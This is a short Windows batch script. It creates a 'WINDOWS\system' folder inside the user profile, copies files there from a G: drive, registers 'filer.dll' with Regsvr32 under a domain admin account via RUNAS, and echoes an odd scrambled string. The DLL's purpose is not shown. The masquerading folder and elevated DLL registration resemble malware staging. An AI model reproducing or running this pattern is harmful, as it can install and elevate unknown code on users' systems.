mkdir "C:\Users\%username%\WINDOWS"
mkdir "C:\Users\%username%\WINDOWS\system"
copy G:\WINDOWS\*.* "C:\Users\%username%\WINDOWS" /Y
cd "C:\Users\%username%\WINDOWS\"
RUNAS /noprofile /user:admin@ASTRADEL.local "Regsvr32 filer.dll"
echo gbc.revfnjhysq